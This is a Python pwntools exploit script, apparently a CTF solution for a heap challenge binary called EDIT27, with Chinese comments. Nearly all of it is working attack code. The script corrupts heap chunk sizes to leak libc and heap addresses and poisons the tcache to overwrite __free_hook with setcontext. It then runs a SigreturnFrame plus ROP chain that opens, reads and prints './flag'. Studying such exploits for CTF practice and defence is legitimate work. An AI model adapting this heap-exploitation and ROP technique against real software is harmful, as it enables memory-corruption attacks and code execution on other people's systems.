#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
#context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./EDIT27')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./EDIT27')
context.arch = elf.arch

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,size,content):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.sendlineafter(': ',str(size))
	p.sendafter("Content of heap: \n",content)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

#======================libcbase================================

add(0x420) #0
add(0x80)  #1
add(0x4f0) #2
add(0x10)  #3

delete(0)  # 放入unsortedbin
delete(1)  # 放入tcachebin

#=======edit heap size========
add(0x88)  #4 使用 chunk1
edit(4,0x90,b'a'*0x80+p64(0x4c0)+p64(0x500))

delete(2)
add(0x420) #5

show(4)
leak = u64(p.recv(6).ljust(8, "\x00")) # 泄露 unsortedbin 真实地址
libcbase = leak - 0x3ebca0 # unsortedbin 与 libc 偏移 == 0x3ebca0
setcontext_door = libcbase + libc.sym['setcontext'] + 53
free_hook = libcbase + libc.sym['__free_hook']

pr('leak',leak)
pr('libcbase',libcbase)
pr('free_hook',free_hook)

#========================heapbase==============================

add(0x590) #6 使用 unsortedbin
delete(6) 

show(4) # show(chunk1)
heapbase = u64(p.recv(24)[-8:].ljust(8, "\x00")) - 0x680 # 0x250 + 0x430 
pr('heapbase',heapbase)

#==============================================================

#在 unsortedbin 中分配两个块，可以控制的是 7 (即chunk1的指针) ，8是为了防止 7 释放后和 unsortedbin 合并
add(0x10) #7 
add(0x10) #8
delete(7) # 放入tcachebin [1]
edit(4,0x10,p64(free_hook))
add(0x540) #9 让  unsortedbin 全部使用防止后面块从这里分配
add(0x10) #10 tcachebin [0]
add(0x10) #11 tcachebin [-1] # 11 分配到 7->bk 指向地址
edit(11,0x10,p64(setcontext_door)) #在指定地址写入

#=========================setcontext===========================

prdi_ret = libcbase + libc.search(asm("pop rdi\nret")).next()
prsi_ret = libcbase + libc.search(asm("pop rsi\nret")).next()
prdx_ret = libcbase + libc.search(asm("pop rdx\nret")).next()

def ropchain(function,arg1,arg2,arg3):
	ret  = p64(prdi_ret) + p64(arg1)
	ret += p64(prsi_ret) + p64(arg2)
	ret += p64(prdx_ret) + p64(arg3)
	ret += p64(function)
	return ret

open_addr = libcbase + libc.sym['open']
read_addr = libcbase + libc.sym['read']
write_addr = libcbase + libc.sym['write']

context_addr = heapbase + 0xc40 #0x250 + 0x430 + 0x20 + 0x20 + 0x550 + 0x20 + 0x10
flag_string_addr = context_addr + 0x200 #0xe40
frame = SigreturnFrame()
frame.rsp = context_addr + 0xf8
frame.rip = libcbase + libc.search(asm("ret")).next()

payload = str(frame)
payload += ropchain(open_addr,flag_string_addr,0,0)
payload += ropchain(read_addr,3,flag_string_addr,0x30)
payload += ropchain(write_addr,1,flag_string_addr,0x30)
payload = payload.ljust(0x200,'\x00') 
payload += './flag\x00'

#============================================================

add(0x300) #12
edit(12,0x300,payload)

delete(12)
p.interactive()
